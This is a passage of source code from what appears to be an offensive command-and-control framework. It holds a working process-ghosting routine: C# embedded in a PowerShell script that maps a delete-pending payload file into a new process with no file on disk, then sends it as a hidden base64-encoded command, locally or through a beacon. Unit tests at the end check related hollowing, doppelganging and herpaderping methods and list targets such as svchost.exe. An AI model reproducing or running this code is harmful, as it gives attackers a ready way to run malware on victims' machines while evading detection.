            FileDispositionInfo);
        Marshal.FreeHGlobal(fdiPtr);

        // 3. Write payload while handle is live (file is delete-pending
        //    but accessible via this handle)
        uint written;
        WriteFile(hFile, payload, (uint)payload.Length, out written, IntPtr.Zero);

        // 4. Create IMAGE section from the delete-pending file
        IntPtr hSection = IntPtr.Zero;
        int status = NtCreateSection(out hSection, SECTION_ALL, IntPtr.Zero,
            IntPtr.Zero, PAGE_RO, SEC_IMAGE, hFile);

        // 5. Close handle — file is deleted from disk here
        CloseHandle(hFile);

        if (status != 0)
            return string.Format("HOLLOW_FAILED: NtCreateSection 0x{0:X8}", status);

        // 6. Create process from the section (no backing file on disk)
        IntPtr hProcess = IntPtr.Zero;
        status = NtCreateProcessEx(out hProcess, PROCESS_ALL, IntPtr.Zero,
            System.Diagnostics.Process.GetCurrentProcess().Handle,
            0x4, hSection, IntPtr.Zero, IntPtr.Zero, false);
        CloseHandle(hSection);

        if (status != 0 || hProcess == IntPtr.Zero)
            return string.Format("HOLLOW_FAILED: NtCreateProcessEx 0x{0:X8}", status);

        // 7. Locate entry point via PEB
        PROCESS_BASIC_INFO pbi; uint retLen;
        NtQueryInformationProcess(hProcess, 0, out pbi,
            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFO)), out retLen);

        byte[] pebBuf = new byte[0x20]; IntPtr nRead;
        ReadProcessMemory(hProcess, pbi.PebBaseAddress, pebBuf, pebBuf.Length, out nRead);
        IntPtr imageBase = (IntPtr)BitConverter.ToInt64(pebBuf, 0x10);

        byte[] hdrBuf = new byte[0x400];
        ReadProcessMemory(hProcess, imageBase, hdrBuf, hdrBuf.Length, out nRead);
        int e_lfanew = BitConverter.ToInt32(hdrBuf, 0x3C);
        int epRva    = BitConverter.ToInt32(hdrBuf, e_lfanew + 0x28);
        IntPtr ep    = (IntPtr)(imageBase.ToInt64() + epRva);

        // 8. Create main thread
        IntPtr hThread = IntPtr.Zero;
        status = NtCreateThreadEx(out hThread, PROCESS_ALL, IntPtr.Zero,
            hProcess, ep, IntPtr.Zero, 1,
            UIntPtr.Zero, UIntPtr.Zero, UIntPtr.Zero, IntPtr.Zero);

        if (status != 0) { CloseHandle(hProcess); return string.Format("HOLLOW_FAILED: NtCreateThreadEx 0x{0:X8}", status); }

        NtQueryInformationProcess(hProcess, 0, out pbi,
            (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFO)), out retLen);
        int newPid = (int)pbi.UniqueProcessId.ToInt64();

        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);

        return string.Format("HOLLOW_SUCCESS: Ghosting PID {0}\nHOLLOW_PID:{0}", newPid);
    }
}
'@

try {
    $payload = [IO.File]::ReadAllBytes("PAYLOAD_PATH")
    $result  = [Ghost]::Run($payload)
    Write-Output $result
} catch {
    Write-Output "HOLLOW_FAILED: $_"
}
""".replace("PAYLOAD_PATH", payload_arg)

        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
        cmd = f"powershell.exe -NoProfile -EncodedCommand {encoded}"
        output = await self._exec(cmd, beacon_id)

        if "HOLLOW_SUCCESS" in output:
            action.status = "success"
            for line in output.splitlines():
                if "HOLLOW_PID:" in line:
                    try:
                        action.target_pid = int(line.split(":")[1].strip())
                    except (ValueError, IndexError):
                        pass
            action.output = output
        else:
            action.status = "failed"
            action.error = output[:300]

    async def _exec(self, cmd: str, beacon_id: str) -> str:
        """Execute command locally or via C2."""
        if beacon_id:
            try:
                from forge_c2.tasks.task_shell import ShellTask
                task = ShellTask(
                    task_id=f"hollow_{beacon_id[:8]}",
                    command=cmd, timeout=15, hidden=True,
                )
                result = await task.execute()
                return result.output or ""
            except ImportError:
                pass

        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15.0)
            return stdout.decode(errors="replace") + stderr.decode(errors="replace")
        except Exception as exc:
            return f"ERROR: {exc}"


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestProcessHollow:
    """Tests for ProcessHollow module."""

    def test_phase(self) -> None:
        assert ProcessHollow.PHASE == 10

    def test_tags(self) -> None:
        assert "process-hollowing" in ProcessHollow.TAGS
        assert "mitre-T1055.012" in ProcessHollow.TAGS

    def test_hollowable_targets(self) -> None:
        assert "svchost.exe" in HOLLOWABLE_TARGETS
        assert len(HOLLOWABLE_TARGETS) >= 8

    def test_hollow_action_defaults(self) -> None:
        a = HollowAction()
        assert a.technique == "classic"
        assert a.status == "pending"

    def test_doppelgang_script_contains_txf(self) -> None:
        mod = ProcessHollow.__new__(ProcessHollow)
        # Verify the script is a real TxF implementation, not a stub
        import asyncio, inspect
        src = inspect.getsource(mod._doppelgang)
        assert "CreateTransaction" in src
        assert "CreateFileTransacted" in src
        assert "NtCreateSection" in src
        assert "NtCreateProcessEx" in src
        assert "RollbackTransaction" in src

    def test_herpaderp_script_section_before_overwrite(self) -> None:
        mod = ProcessHollow.__new__(ProcessHollow)
        import inspect
        src = inspect.getsource(mod._herpaderp)
        assert "NtCreateSection" in src
        assert "BENIGN_STUB" in src
        assert "NtCreateProcessEx" in src

    def test_ghost_script_delete_pending(self) -> None:
        mod = ProcessHollow.__new__(ProcessHollow)
        import inspect
        src = inspect.getsource(mod._ghost)
        assert "NtSetInformationFile" in src
        assert "DeleteFile" in src
        assert "NtCreateSection" in src
        assert "NtCreateProcessEx" in src
